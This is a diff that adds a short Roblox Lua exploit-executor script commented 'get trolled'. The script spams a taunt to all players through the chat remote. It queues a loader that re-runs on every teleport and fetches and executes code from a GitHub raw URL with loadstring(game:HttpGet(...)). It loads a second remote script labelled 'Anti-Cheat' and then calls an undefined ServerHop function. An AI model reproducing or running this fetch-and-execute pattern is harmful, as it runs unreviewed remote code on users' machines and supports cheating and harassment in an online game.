@@ -1,0 +1,17 @@
+-- get trolled
+ if not game:IsLoaded() then game.Loaded:Wait() end
+  repeat wait(0.1) until  game.Loaded
+  local args = {
+    [1] = "L",
+    [2] = "All"
+}
+
+game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest"):FireServer(unpack(args))
+
+  queue_on_teleport([[
+     if not game:IsLoaded() then game.Loaded:Wait() end
+  repeat wait(0.1) until  game.Loaded and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart") 
+    loadstring(game:HttpGet(("https://raw.githubusercontent.com/JustAP1ayer/ignorewtffxd/main/2131.lua"),true))()
+    ]])
+loadstring(game:HttpGet('https://raw.githubusercontent.com/1201for/V.G-Hub/main/Extras/Anti-Cheat'))()
+ServerHop()
